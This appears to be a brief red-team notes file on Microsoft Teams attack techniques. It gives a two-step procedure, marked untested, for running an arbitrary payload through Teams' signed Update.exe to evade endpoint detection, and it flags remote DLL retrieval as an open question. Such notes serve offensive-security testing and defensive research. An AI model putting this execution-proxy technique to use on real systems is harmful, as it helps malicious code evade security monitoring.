<!---------------------------------------------------------------------------------
Copyright: (c) BLS OPS LLC.
This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, version 3.
This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
GNU General Public License for more details.
You should have received a copy of the GNU General Public License
along with this program. If not, see <https://www.gnu.org/licenses/>.
--------------------------------------------------------------------------------->
# Teams
### References

### Attacks


### Needs testing
* "Bypass EDR with MSTeams"
	* References
		* [https://twitter.com/misconfig/status/1481198346379436035](https://twitter.com/misconfig/status/1481198346379436035)
	* Process
		1. Copy payload into Teams' `current` directory

				%userprofile%\AppData\Local\Microsoft\Teams\current\
		1. Execute payload

				%userprofile%\AppData\Local\Microsoft\Teams\Update.exe --processStart payload.exe --process-start-args "args"
	* Persistence
* Remote DLL Retrieval(?)
	* `AppDomain` and `update.config`
